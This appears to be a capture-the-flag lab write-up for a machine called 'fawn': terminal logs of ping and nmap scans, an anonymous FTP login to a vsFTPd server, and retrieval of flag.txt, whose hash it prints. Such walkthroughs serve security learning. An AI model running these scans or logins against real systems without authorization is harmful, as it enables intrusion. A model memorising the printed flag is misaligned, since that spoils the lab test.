# fawn

```
┌──(kali㉿kali)-[~/Downloads]
└─$ ping 10.129.1.14  
PING 10.129.1.14 (10.129.1.14) 56(84) bytes of data.
64 bytes from 10.129.1.14: icmp_seq=1 ttl=63 time=23.8 ms
64 bytes from 10.129.1.14: icmp_seq=2 ttl=63 time=23.9 ms
64 bytes from 10.129.1.14: icmp_seq=3 ttl=63 time=23.7 ms
^C
--- 10.129.1.14 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2007ms
rtt min/avg/max/mdev = 23.685/23.792/23.894/0.085 ms
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -sC 10.129.1.14  
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-07 17:55 EDT
Nmap scan report for 10.129.1.14
Host is up (0.025s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.15.77
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt

Nmap done: 1 IP address (1 host up) scanned in 1.05 seconds
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo nmap -O 10.129.1.14 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-07 18:02 EDT
Nmap scan report for 10.129.1.14
Host is up (0.024s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=9/7%OT=21%CT=1%CU=37693%PV=Y%DS=2%DC=I%G=Y%TM=66DCC
OS:D68%P=x86_64-pc-linux-gnu)SEQ(SP=FC%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SE
OS:Q(SP=FD%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=FD%GCD=1%ISR=10B%TI=Z%C
OS:I=Z%II=I%TS=A)OPS(O1=M552ST11NW7%O2=M552ST11NW7%O3=M552NNT11NW7%O4=M552S
OS:T11NW7%O5=M552ST11NW7%O6=M552ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5
OS:=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M552NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%
OS:T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T
OS:=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=
OS:0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(
OS:R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.30 seconds
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ ftp -h
ftp: -h: unknown option
usage: ftp [-46AadefginpRtVv] [-N NETRC] [-o OUTPUT] [-P PORT] [-q QUITTIME]
           [-r RETRY] [-s SRCADDR] [-T DIR,MAX[,INC]] [-x XFERSIZE]
           [[USER@]HOST [PORT]]
           [[USER@]HOST:[PATH][/]]
           [file:///PATH]
           [ftp://[USER[:PASSWORD]@]HOST[:PORT]/PATH[/][;type=TYPE]]
           [http://[USER[:PASSWORD]@]HOST[:PORT]/PATH]
           [https://[USER[:PASSWORD]@]HOST[:PORT]/PATH]
           ...
       ftp -u URL FILE ...
       ftp -?
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ ftp Anonymous@10.129.1.14
Connected to 10.129.1.14.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
ftp> ls
229 Entering Extended Passive Mode (|||34103|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
226 Directory send OK.
ftp> cat flag.txt
?Invalid command.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||42217|)
150 Opening BINARY mode data connection for flag.txt (32 bytes).
100% |*************************************************************|    32      892.85 KiB/s    00:00 ETA
226 Transfer complete.
32 bytes received in 00:00 (1.25 KiB/s)
ftp> bye
221 Goodbye.
```

```
┌──(kali㉿kali)-[~/Downloads]
└─$ cat flag.txt 
035db21c881520061c53e0536e44f815 
```
